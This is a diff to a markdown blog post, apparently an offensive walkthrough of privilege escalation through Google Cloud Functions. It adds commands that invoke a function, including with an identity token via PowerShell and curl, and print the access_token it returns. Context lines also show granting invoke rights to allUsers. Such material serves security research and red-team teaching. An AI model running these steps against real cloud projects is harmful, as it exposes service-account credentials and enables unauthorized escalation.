@@ -828,7 +828,7 @@ py.exe .\main.py --project-id <project-id> --location <region> --function-name <
 py.exe .\main.py --project-id <project-id> --location <region> --function-name <function> --setiambinding allUsers
 ```
 <p>
-  <img src="https://github.com/anrbn/blog/blob/main/images/28.png">
+  <img src="https://github.com/anrbn/blog/blob/main/images/28.1.png">
 </p>
 <p>
   <img src="https://github.com/anrbn/blog/blob/main/images/27.png">
@@ -836,10 +836,20 @@ py.exe .\main.py --project-id <project-id> --location <region> --function-name <
 
 ### Invoking the Cloud Function
 With the required access in place we can Invoke the Cloud Function. There are two ways to Invoke Cloud Function depending on whether an Authenticated user (Service Account, Group, User) or Unauthenticated user (allUsers) is given the Role:"Cloud Functon Invocation".
-  
+
+For Unauthenticated Users (allUsers):
+
+```shell
+curl <function-invocation-url>
+```
+
 For Authenticated Users (Service Account, Group, User):
 
-  ```powershell
+<p>
+  <img src="https://github.com/anrbn/blog/blob/main/images/29.png">
+</p>
+  
+```powershell
 $accessToken = $(gcloud auth print-identity-token)
 $headers = @{
     "Authorization" = "bearer $accessToken"
@@ -849,6 +859,17 @@ $body = '{}'
 $response = Invoke-RestMethod -Method POST -Uri '<function-invocation-url>' -Headers $headers -Body $body -TimeoutSec 70
 Write-Output $response.access_token
 ```
+<p>
+  <img src="https://github.com/anrbn/blog/blob/main/images/30.png">
+</p>
+```shell
+access_token=$(gcloud auth print-identity-token)
+headers="Authorization: bearer ${access_token}"
+headers="${headers}"$'\n'"Content-Type: application/json"
+body='{}'
+response=$(curl -sS -X POST -H "${headers}" -d "${body}" -m 70 '<function-invocation-url>')
+echo "${response}" | jq -r '.access_token'
+``` 
   
 ## Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform
 To Privilege Escalate via Cloud Function in Google Cloud Platform we'll be taking the path with least privileges possible. 
